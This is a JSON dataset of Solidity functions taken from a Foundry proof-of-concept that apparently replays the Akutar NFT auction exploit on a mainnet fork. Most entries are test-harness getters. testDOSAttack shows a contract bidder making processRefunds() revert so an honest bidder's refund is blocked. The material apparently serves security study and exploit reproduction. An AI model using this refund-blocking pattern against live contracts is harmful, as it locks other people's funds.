[
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 14_636_844); // fork mainnet at 14636844\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "testDOSAttack",
    "original_code": "    function testDOSAttack() public {\n        address honestUser = 0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4;\n        address maliciousUser = address(this); // malicious User is a contract address\n\n        cheats.prank(maliciousUser); //maliciousUser makes a bid\n        akutarNft.bid{value: 3.5 ether}(1);\n        console.log(\"honestUser Balance before Bid: \", honestUser.balance / 1 ether);\n\n        cheats.prank(honestUser); //honestUser makes a bid\n        akutarNft.bid{value: 3.75 ether}(1);\n        console.log(\"honestUser Balance after Bid: \", honestUser.balance / 1 ether);\n\n        //Set the block.height to the time when the auction was over and processRefunds() can be invoked\n        //https://etherscan.io/tx/0x62d280abc60f8b604175ab24896c989e6092e496ac01f2f5399b2a62e9feaacf\n        //use - https://www.epochconverter.com/ for UTC <-> epoch\n        cheats.warp(1_650_674_809);\n\n        cheats.prank(maliciousUser);\n        try akutarNft.processRefunds() {}\n        catch Error(string memory Exception) {\n            console.log(\"processRefunds() REVERT : \", Exception);\n        }\n        //Since the honestUser's bid was after maliciousUser's bid, the bid amount of the honestUser is never returned due to the revert Exception\n        console.log(\"honestUser Balance post processRefunds: \", honestUser.balance / 1 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AkutarNFTExploit",
    "source_type": "attacker_contract",
    "function_name": "testclaimProjectFunds",
    "original_code": "    function testclaimProjectFunds() public {\n        address ownerOfAkutarNFT = 0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9;\n\n        //Set the block.height to the time when the auction was over and claimProjectFunds() can be invoked\n        cheats.warp(1_650_672_435);\n\n        cheats.prank(ownerOfAkutarNFT);\n        try akutarNft.claimProjectFunds() {}\n        catch Error(string memory Exception) {\n            console.log(\"claimProjectFunds() ERROR : \", Exception);\n        }\n",
    "description": ""
  }
]